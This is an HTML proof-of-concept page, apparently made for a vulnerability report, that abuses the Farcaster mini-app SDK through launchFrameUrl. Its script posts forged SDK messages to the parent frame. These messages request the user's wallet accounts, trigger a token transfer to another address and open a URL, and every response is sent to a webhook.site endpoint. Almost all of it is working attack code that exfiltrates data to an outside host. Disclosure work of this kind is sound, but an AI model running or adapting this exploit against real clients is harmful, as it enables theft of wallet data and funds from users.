<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>PoC</title>
		<style>
			body {
				font-family: -apple-system, sans-serif;
				background: #17101f;
				color: #fff;
				padding: 16px;
				font-size: 13px;
			}
			.banner {
				background: #dc2626;
				padding: 10px;
				border-radius: 8px;
				margin-bottom: 12px;
				font-weight: bold;
				text-align: center;
			}
			pre {
				background: #0d0912;
				padding: 8px;
				border-radius: 6px;
				font-size: 11px;
				color: #ccc;
				white-space: pre-wrap;
				word-break: break-all;
			}
		</style>
	</head>
	<body>
		<div class="banner">PoC v2 — Farcaster SDK Access via launchFrameUrl</div>
		<pre id="log">Starting...</pre>

		<script>
			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
			var msgCounter = 7000;
			var logEl = document.getElementById("log");

			function log(msg) {
				logEl.textContent += "\n" + msg;
			}

			function sendToWebhook(label, data) {
				try {
					fetch(WEBHOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" }, body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }) });
				} catch (e) {}
			}

			window.addEventListener("message", function (event) {
				if (event.data && (event.data.type === "HANDLER" || event.data.type === "RAW")) {
					log("RESPONSE [id:" + event.data.id + "]: " + JSON.stringify(event.data.value || "(success)").substring(0, 120));
					sendToWebhook("RESPONSE", event.data);
				}
			});

			function wireRaw(val) {
				return [{ type: "RAW", value: val }];
			}

			function call(method, wireArgs) {
				var id = msgCounter++;
				window.parent.postMessage({ id: id, type: "APPLY", path: [method], argumentList: wireArgs }, "*");
				log("CALL: " + method + " [id:" + id + "]");
				return id;
			}

			// 1. Signal ready (2s)
			setTimeout(function () {
				call("ready", wireRaw({}));
			}, 2000);

			// 2. Get wallet accounts (4s) — proves data extraction
			setTimeout(function () {
				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
			}, 4000);

			// 3. Connect wallet — THIS returns the address (6s)
			setTimeout(function () {
				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_requestAccounts", params: [] }));
			}, 6000);

			setTimeout(function () {
				call(
					"sendToken",
					wireRaw({
						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
						amount: "0.0001",
						recipientAddress: "0x0000000000000000000000000000000000000001",
					}),
				);
			}, 8000);

			setTimeout(function () {
				call("openUrl", wireRaw("https://example.com"));
			}, 10000);
		</script>
	</body>
</html>
